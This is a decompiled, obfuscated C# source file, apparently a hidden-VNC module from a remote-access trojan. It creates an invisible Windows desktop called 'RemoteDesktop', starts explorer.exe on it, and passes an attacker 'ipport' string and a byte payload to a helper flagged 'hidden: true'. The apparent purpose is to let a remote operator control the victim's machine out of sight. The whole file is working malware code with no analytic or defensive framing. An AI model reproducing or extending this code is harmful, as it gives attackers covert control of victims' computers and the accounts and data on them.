using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class1
{
	public struct Struct1
	{
		public int int_0;

		public IntPtr intptr_0;

		public int int_1;
	}

	private const uint uint_0 = 32u;

	private const uint uint_1 = 32u;

	private const uint uint_2 = 1u;

	private const uint uint_3 = 4u;

	private const uint uint_4 = 2u;

	private const uint uint_5 = 64u;

	private const uint uint_6 = 8u;

	private const uint uint_7 = 32u;

	private const uint uint_8 = 16u;

	private const uint uint_9 = 1u;

	private const uint uint_10 = 256u;

	private const uint uint_11 = 128u;

	private static IntPtr intptr_0;

	private static Struct1 struct1_0;

	public static int int_0;

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr CreateDesktopW(string desktopName, IntPtr device, IntPtr deviceMode, uint flags, uint accessMask, Struct1 attributes);

	public static void smethod_0(string ipport, byte[] DLByte)
	{
		int num = 0;
		int num2 = 0;
		object obj = "";
		try
		{
			ProjectData.ClearProjectError();
			struct1_0.int_1 = -1;
			struct1_0.intptr_0 = (IntPtr)0L;
			intptr_0 = CreateDesktopW("RemoteDesktop", (IntPtr)0L, (IntPtr)0L, 1u, 511u, struct1_0);
			Class5.Struct2 processInformation = default(Class5.Struct2);
			Class5.Struct3 startupInfo = default(Class5.Struct3);
			startupInfo.int_0 = Marshal.SizeOf(typeof(Class5.Struct3));
			startupInfo.string_1 = "RemoteDesktop";
			IntPtr intPtr = default(IntPtr);
			Class5.delegate11_0(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "Windows\\explorer.exe", null, intPtr, intPtr, inheritHandles: false, 0u, IntPtr.Zero, null, ref startupInfo, ref processInformation);
			Class5.smethod_2(Process.GetCurrentProcess().MainModule!.FileName, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(ipport + " "), Class6.smethod_1()), (object)" "), (object)Class6.smethod_0().Width), (object)" x "), (object)Class6.smethod_0().Height)), DLByte, compatible: true, hidden: true, "RemoteDesktop", int_0);
		}
		catch when (obj is Exception && num != 0 && num2 == 0)
		{
		}
		throw ProjectData.CreateProjectError(-2146828237);
	}

	public static void smethod_1()
	{
		try
		{
			Process.GetProcessById(int_0).Kill();
		}
		catch (Exception)
		{
		}
	}
}
